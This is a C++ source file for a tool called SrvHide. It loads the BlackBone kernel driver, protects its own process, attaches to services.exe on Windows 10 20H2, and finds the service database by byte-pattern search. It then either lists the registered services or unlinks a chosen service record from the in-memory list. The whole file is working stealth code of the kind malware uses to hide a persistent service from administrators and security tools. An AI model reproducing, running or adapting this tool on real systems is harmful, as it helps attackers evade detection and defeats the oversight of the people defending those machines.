#include <BlackBone/Process/Process.h>
#include <BlackBone/Patterns/PatternSearch.h>
#include <BlackBone/Misc/InitOnce.h>
#include <BlackBone/Misc/Trace.hpp>
#include <argparse/argparse.hpp>

using namespace blackbone;

// Windows 10 20H2 signature.
//
static const std::vector<uint8_t> srv_db_pattern{
    0x48, 0x8B, 0x1D, 0x00, 0x00, 0x00, 0x00,   // mov     rbx, qword ptr cs:g_ServicesDB
    0x48, 0x85, 0xDB,                           // test    rbx, rbx
    0x74, 0x00,                                 // jz      short loc_7FF78BAE1E61
    0x48, 0x8B, 0x4B, 0x38,                     // mov     rcx, [rbx+38h]  ; String1
    0x48, 0x8B, 0xD7,                           // mov     rdx, rdi        ; String2
    0x48, 0xFF, 0x15, 0x00, 0x00, 0x00, 0x00    // call    cs:__imp__wcsicmp
};

// CServiceRecord structure.
//
struct record_t
{
    ptr_t a0;
    ptr_t a1;
    ptr_t a2;
    ptr_t next;
    ptr_t a3;
    ptr_t a4;
    ptr_t a5;
    ptr_t name;
};

static void dump_services(ProcessMemory& mem, ptr_t base)
{
    record_t rec{ 0 };
    for (; base; base = rec.next)
    {
        mem.Read(base, sizeof(record_t), &rec);
        if (rec.name)
        {
            wchar_t name[256]{ 0 };
            mem.Read(rec.name, 256 * sizeof(wchar_t), name);
            std::wprintf(L"[*] 0x%llx - %ls\n", base, name);
        }
        else
        {
            std::printf("[-] 0x%llx has no name\n", base);
        }
    }
}

static void hide_service(ProcessMemory& mem, ptr_t base, const std::wstring& srv_name)
{
    record_t rec{ 0 };
    ptr_t prev_ptr = base;
    ptr_t cur_ptr = base;
    for (; cur_ptr; cur_ptr = rec.next)
    {
        mem.Read(cur_ptr, sizeof(record_t), &rec);
        if (rec.name)
        {
            wchar_t name[256]{ 0 };
            mem.Read(rec.name, 256 * sizeof(wchar_t), name);
            if (!std::wcscmp(name, srv_name.data()))
            {
                std::printf("[+] Match found!\n");
                // Check if it's first element in list.
                //
                if (cur_ptr == prev_ptr)
                {
                    // Just set base to rec.next.
                    //
                    mem.Write(base, sizeof(ptr_t), &rec.next);
                }
                else
                {
                    // Link previous with the next one.
                    //
                    mem.Write(prev_ptr + offsetof(record_t, next), sizeof(ptr_t), &rec.next);
                }
            }
        }
        prev_ptr = cur_ptr;
    }
}

int main(int argc, char** argv)
{
    argparse::ArgumentParser program("SrvHide: Hide service in services.exe");

    program.add_argument("-s", "--service")
        .help("Service name to hide")
        .default_value<std::string>("");

    program.add_argument("-d", "--dump")
        .help("Dump services database")
        .default_value(false)
        .implicit_value(true);

    try
    {
        program.parse_args(argc, argv);
    }
    catch (const std::runtime_error& err) 
    {
        std::cerr << err.what() << std::endl;
        std::cerr << program;
        std::exit(1);
    }

    auto srv_name = program.get<std::string>("--service");
    auto do_dump  = program.get<bool>("--dump");
    if (srv_name.empty() || !do_dump)
    {
        std::cerr << program;
        std::exit(1);
    }

    auto pids = Process::EnumByName(L"services.exe");
    if (pids.empty() || pids.size() > 1)
    {
        std::cerr << "Failed to find services.exe" << std::endl;
        std::exit(1);
    }

    auto srv_pid = pids.at(0);
    std::printf("[+] Services.exe PID: %d\n", srv_pid);
    // 
    InitializeOnce();
    // Load BlackBone driver.
    //
    if (!NT_SUCCESS(Driver().EnsureLoaded()))
    {
        std::printf("[-] Failed to load driver. Status: 0x%x\n", LastNtStatus());
        std::exit(1);
    }
    std::printf("[+] Check driver loaded: Success\n");
    // Protect current process so we can tinker with services.exe.
    //
    if (!NT_SUCCESS(Driver().ProtectProcess(GetCurrentProcessId(), Policy_Enable)))
    {
        std::printf("[-] Failed to protect current process. Status: 0x%x\n", LastNtStatus());
        std::exit(1);
    }
    std::printf("[+] Protect current process: Success\n");
    // Attach to services.exe.
    //
    if (Process proc; NT_SUCCESS(proc.Attach(srv_pid)))
    {
        // Get main module.
        //
        auto& memory = proc.memory();
        auto module  = proc.modules().GetMainModule();
        std::printf("[*] Services.exe - 0x%llx - 0x%x\n", module->baseAddress, module->size);
        // Scan for database pointer.
        //
        std::vector<ptr_t> matches;
        PatternSearch ps(srv_db_pattern);
        ps.SearchRemote(proc, 0x00, module->baseAddress, module->size, matches);

        if (matches.size() != 1)
        {
            std::printf("[-] Failed to find pattern in services.exe\n");
            std::exit(1);
        }
        auto pattern_ptr = matches.at(0);
        // Get g_ServicesDB pointer location.
        //
        uint32_t services_db_off;
        if (!NT_SUCCESS(memory.Read(pattern_ptr + 3, 4, &services_db_off)))
        {
            std::printf("[-] Failed to read memory at 0x%llx\n", pattern_ptr);
            std::exit(1);
        }
        ptr_t services_db_loc = pattern_ptr + services_db_off + 7;
        std::printf("[+] g_ServicesDB location - 0x%llx\n", services_db_loc);
        // Read g_ServicesDB pointer.
        //
        ptr_t services_db;
        memory.Read(services_db_loc, sizeof(void*), &services_db);
        std::printf("[+] g_ServicesDB - 0x%llx\n", services_db);
        // Process commands.
        //
        if (program["--dump"] == true)
            dump_services(memory, services_db);
        if (!srv_name.empty())
            hide_service(memory, services_db, { srv_name.begin(), srv_name.end() });
    }
    else
    {
        std::printf("[-] Failed to attach to %d. Error code: %d\n", srv_pid, GetLastError());
    }
}
